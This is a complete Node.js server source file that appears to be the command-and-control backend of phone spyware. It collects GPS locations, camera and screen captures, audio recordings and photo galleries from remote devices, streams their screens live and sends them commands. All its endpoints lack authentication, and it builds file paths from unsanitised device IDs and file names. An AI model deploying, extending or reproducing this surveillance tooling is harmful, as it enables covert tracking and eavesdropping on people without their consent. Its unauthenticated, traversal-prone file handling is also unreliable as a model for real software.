const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');
const http = require('http'); 
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 3000;

// --- 1. SETUP & CONFIG ---
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

app.use(cors({ origin: '*' })); // Allow all connections
app.use(bodyParser.json({ limit: '50mb' })); // Increased limit for photos
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));

// Serve Uploaded Files (Images/Audio accessible via URL)
app.use('/uploads', express.static(UPLOADS_DIR));

// --- 2. SOCKET.IO (Simple & Stable) ---
const io = new Server(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    maxHttpBufferSize: 1e8, // 100MB buffer
    transports: ['websocket', 'polling']
});

let devicesStatus = {}; // RAM me status save rahega

io.on('connection', (socket) => {
    console.log('🔌 New Connection:', socket.id);

    // Join Room (Device ID)
    socket.on('join', (roomID) => {
        socket.join(roomID);
        console.log(`📱 Device Joined: ${roomID}`);
    });

    // Screen Share Data Relay
    socket.on('screen-data', (data) => {
        // Broadcast to admin in the same room
        socket.to(data.room).emit('screen-data', data.image);
    });

    // Send Commands (Socket)
    socket.on('send-command', (data) => {
        if(data.targetId && data.command) {
            io.to(data.targetId).emit('command', data.command);
        }
    });

    socket.on('disconnect', () => {});
});

app.get('/', (req, res) => {
    res.send('✅ Server is Running (Stable Version)');
});

// ==================================================
//  🔥 3. DATA UPLOAD (JSON Logs)
// ==================================================
app.post('/api/upload_data', (req, res) => { 
    let { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No Device ID" });

    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);
    
    // Save to RAM for Live Status
    if(type === 'location') {
        try {
            let loc = (typeof data === 'string') ? JSON.parse(data) : data;
            if(Array.isArray(loc)) loc = loc[loc.length-1]; // Get latest
            if(!devicesStatus[id]) devicesStatus[id] = { id: id };
            devicesStatus[id].lat = loc.latitude || loc.lat;
            devicesStatus[id].lon = loc.longitude || loc.lon;
            devicesStatus[id].lastSeen = Date.now();
        } catch(e) {}
    }

    // Save to File (Append or Overwrite)
    // Simple logic: Read -> Append -> Write
    let existingData = [];
    if (fs.existsSync(filePath)) {
        try { existingData = JSON.parse(fs.readFileSync(filePath)); } catch(e) {}
    }
    
    let newData = (typeof data === 'string') ? JSON.parse(data) : data;
    let finalData = Array.isArray(newData) ? [...newData, ...existingData] : [newData, ...existingData];
    
    // Limit file size (Last 2000 records only)
    finalData = finalData.slice(0, 2000);

    fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
    res.json({ status: "success" });
});

app.get('/api/get-data/:device_id/:type', (req, res) => {
    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.json([]);
    }
});

// ==================================================
//  📷 4. IMAGE UPLOAD (Local Storage)
// ==================================================
app.post('/api/upload-image', (req, res) => {
    let { device_id, image_data, type } = req.body; // type = 'camera', 'screen', etc.
    if (!device_id || !image_data) return res.status(400).send("Missing Data");

    const id = device_id.toUpperCase();
    const deviceFolder = path.join(UPLOADS_DIR, id);
    if (!fs.existsSync(deviceFolder)) fs.mkdirSync(deviceFolder, { recursive: true });

    // Filename logic
    const timestamp = Date.now();
    const filename = `${type || 'cam'}-${timestamp}.jpg`;
    const savePath = path.join(deviceFolder, filename);

    // Convert Base64 to Buffer
    const base64Data = image_data.replace(/^data:image\/\w+;base64,/, "");
    
    fs.writeFile(savePath, base64Data, 'base64', (err) => {
        if (err) return res.status(500).send("Error saving");
        
        // Generate Public URL
        const fileUrl = `${req.protocol}://${req.get('host')}/uploads/${id}/${filename}`;
        
        // Notify Frontend via Socket
        io.emit('new-file', { device_id: id, url: fileUrl, type: type });
        
        res.json({ status: "success", url: fileUrl });
    });
});

// ==================================================
//  🎤 5. AUDIO UPLOAD (Local Storage)
// ==================================================
app.post('/api/upload-audio', (req, res) => {
    let { device_id, audio_data, filename } = req.body;
    if (!device_id || !audio_data) return res.status(400).send("Missing Data");

    const id = device_id.toUpperCase();
    const deviceFolder = path.join(UPLOADS_DIR, id);
    if (!fs.existsSync(deviceFolder)) fs.mkdirSync(deviceFolder, { recursive: true });

    const finalName = filename || `rec-${Date.now()}.mp3`;
    const savePath = path.join(deviceFolder, finalName);
    
    const base64Data = audio_data.replace(/^data:audio\/\w+;base64,/, "");

    fs.writeFile(savePath, base64Data, 'base64', (err) => {
        if (err) return res.status(500).send("Error saving");
        const fileUrl = `${req.protocol}://${req.get('host')}/uploads/${id}/${finalName}`;
        io.emit('new-audio', { device_id: id, url: fileUrl, name: finalName });
        res.json({ status: "success", url: fileUrl });
    });
});

// ==================================================
//  📂 6. GALLERY & FILE LIST (Reads from Folder)
// ==================================================
app.get('/api/gallery-list/:device_id', (req, res) => {
    const id = req.params.device_id.toUpperCase();
    const deviceFolder = path.join(UPLOADS_DIR, id);
    
    if (!fs.existsSync(deviceFolder)) return res.json({ photos: [] });

    fs.readdir(deviceFolder, (err, files) => {
        if (err) return res.json({ photos: [] });

        // Filter only images
        const images = files
            .filter(file => file.endsWith('.jpg') || file.endsWith('.png'))
            .map(file => `${req.protocol}://${req.get('host')}/uploads/${id}/${file}`)
            .reverse(); // Newest first

        res.json({ photos: images });
    });
});

// ==================================================
//  ⚙️ 7. COMMAND & STATUS
// ==================================================
app.post('/api/status', (req, res) => {
    const { device_id, model, battery, version } = req.body;
    if(device_id) {
        const id = device_id.toUpperCase();
        if(!devicesStatus[id]) devicesStatus[id] = { id: id, command: "none" };
        
        devicesStatus[id].model = model;
        devicesStatus[id].battery = battery;
        devicesStatus[id].version = version;
        devicesStatus[id].lastSeen = Date.now();

        const cmd = devicesStatus[id].command || "none";
        devicesStatus[id].command = "none"; // Clear after sending
        res.json({ status: "success", command: cmd });
    } else {
        res.send("OK");
    }
});

app.post('/api/send-command', (req, res) => {
    let { device_id, deviceId, command } = req.body;
    let target = device_id || deviceId;
    if(!target) return res.status(400).json({error: "No ID"});
    
    target = target.toUpperCase();
    
    // Send via Socket
    io.to(target).emit('command', command);
    
    // Save for Polling
    if(!devicesStatus[target]) devicesStatus[target] = { id: target };
    devicesStatus[target].command = command;
    
    res.json({ status: "success", command });
});

app.get('/api/admin/all-devices', (req, res) => {
    res.json(devicesStatus);
});

server.listen(PORT, () => console.log(`🚀 Server Running on Port ${PORT}`));
